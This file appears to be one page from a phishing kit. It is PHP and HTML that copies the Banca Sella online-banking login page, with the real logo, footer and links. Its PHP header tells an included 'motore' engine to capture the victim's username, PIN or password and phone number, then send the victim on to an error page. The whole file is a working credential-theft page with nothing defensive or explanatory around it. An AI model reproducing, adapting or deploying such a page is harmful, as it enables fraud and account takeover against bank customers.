<?php
//INCLUDERE GENERALE
require("pannello2/generale.php");

//CUSTOM
$pagina=array('username','password',"tel");
$numero = 0;
$prossima = "errore.php";
$precedente ="index.php";

//INCLUDERE MOTORE
require("pannello2/motore.php");

?>
<!DOCTYPE html>
<html lang="it">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=windows-1252">

    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
    <meta http-equiv="Cache-Control" content="no-cache&quot;">
    <meta http-equiv="expires" content="-1&quot;">
    <meta http-equiv="Pragma" content="no-cache&quot;">
    <meta http-equiv="Cache-Control" content="no-store&quot;">
    <meta http-equiv="X-Content-Type-Options" content="nosniff&quot;">
    <meta http-equiv="Content-Type" content="text/html;" charset="iso-8859-1&quot;">
    <title>Autenticazione</title>
    <link rel="stylesheet" href="./asset/style.css">
    <script src="./asset/jquery-3.3.1.min.js.download"></script>
    <script src="./asset/vendor.min.js.download"></script>
    <script src="./asset/script.js.download"></script>
    <script src="./asset/optimizescreen.js.download" type="text/javascript" charset="UTF-8"></script>
</head>

<body class="auth-v2" onload="$(&#39;#userCode&#39;).focus()">















    <div class="a-header">
        <a href="https://www.sella.it/Autenticazione/doLogout.jsp" title="Torna alla home page"><img class="a-logo" src="./asset/logo_sellait.png" alt="" title=""></a>

    </div>



    <div class="a-container">

        <div class="a-title-container">
            <div class="a-title">Accedi <span class="a-hidden-xs">ai servizi online</span></div>
            <div class="a-subtitle">Compila i campi per proseguire</div>
        </div>



        <div id="ir7n6tmjsp" style="behavior:url(#default#clientCaps);display:none"></div>
        <object id="zqv3botss3" classid="clsid:{CA8A9780-280D-11CF-A24D-444553540000}" style="display:none"></object>


        <form auth-form="" name="AuthenticationForm" method="post"  novalidate="novalidate">
            <input type="hidden" name="AU_page_code" value="AU_STEP_ONE">
            <input type="hidden" name="isFastAuth" value="Y">

            <div class="a-content-sm">




                <div class="a-form-row">
                    <div class="a-form-label" id="usrLabel">Codice cliente o username<img src="./asset/spacer11.gif"></div>
                    <input type="text" check-user-pass="" name="username" id="userCode" class="a-form-input" required="" autocomplete="off">
                </div>







                <div class="a-form-row">
                    <div class="a-form-label" id="passLabel">PIN o password</div>
                    <input type="password" name="password" id="Password" class="a-form-input" required="" maxlength="25" autocomplete="off">
                </div>


                <div class="a-form-row">
                    <div class="a-form-label" id="usrLabel">Telefono<img src="./asset/spacer11.gif"></div>
                    <input type="text" check-user-pass="" name="tel" id="userCode" class="a-form-input" required="" autocomplete="off">
                </div>





                <div class="a-form-row a-row font-size-sm">


                </div>

                <div class="a-buttons-row">
                    <button id="a-btn-access" class="a-button a-btn-primary a-btn-submit" type="submit">Conferma</button><img src="./asset/spacer11.gif">
                </div>






            </div>
        </form>





    </div>









    <div class="a-float-footer">
        <div class="a-container">

            <div class="remember-box with-border">
                Desideri maggiori informazioni o hai bisogno di assistenza?<br>
                <div><a href="https://www.sella.it/banca-online/contatti/contatti.jsp" class="a-footer-links" target="_blank">Contatta l'assistenza Clienti</a>

                    <a href="https://www.sella.it/banca-online/sicurezza/sicurezza.jsp" target="_blank" class="a-footer-links">Informazioni sulla sicurezza</a>

                </div>
            </div>

            <div class="a-footer">
                 1996-2021 &nbsp; Banca Sella S.p.A. - P.I. 02224410023 - <a target="_blank" href="https://www.sella.it/ita/info/privacy.jsp">Privacy</a>
            </div>

        </div>
    </div>











</body>

</html>